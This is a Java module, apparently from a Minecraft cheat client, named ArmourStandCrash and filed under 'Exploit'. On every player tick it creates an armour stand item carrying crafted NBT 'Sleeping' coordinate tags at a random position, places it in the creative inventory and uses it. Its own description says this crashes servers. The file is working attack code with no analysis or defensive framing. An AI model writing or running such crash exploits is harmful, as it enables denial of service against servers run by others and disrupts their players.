package net.como.client.module.exploit;

import net.como.client.ComoClient;
import net.como.client.event.EventHandler;
import net.como.client.event.impl.PlayerTickEvent;
import net.como.client.module.Module;
import net.como.client.utils.CrashUtils;
import net.como.client.utils.InteractionUtils;
import net.como.client.utils.NbtUtils;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.ChunkPos;

public class ArmourStandCrash extends Module {
    public ArmourStandCrash() {
        setDescription("An old exploit that crashes servers with armour stands in creative mode.");
        setCategory("Exploit");
    }

    @EventHandler
    public void onTick(PlayerTickEvent event) {
        ItemStack armourStand = new ItemStack(Items.ARMOR_STAND, 1);

        NbtCompound comp = new NbtCompound();
        NbtCompound entityTag = new NbtCompound();

        BlockPos blockPos = CrashUtils.randomPosition(0);

        // Set it to the position
        entityTag.put("SleepingX", NbtInt.of(blockPos.getX()));
        entityTag.put("SleepingY", NbtInt.of(blockPos.getY()));
        entityTag.put("SleepingZ", NbtInt.of(blockPos.getZ()));

        // Add the entity tag
        comp.put("EntityTag", entityTag);

        // Add the NBT Data
        armourStand.setNbt(comp);

        // Create the item
        NbtUtils.giveItem(armourStand, false);

        // Use the item
        InteractionUtils.fireActive(Hand.MAIN_HAND);
    }
}
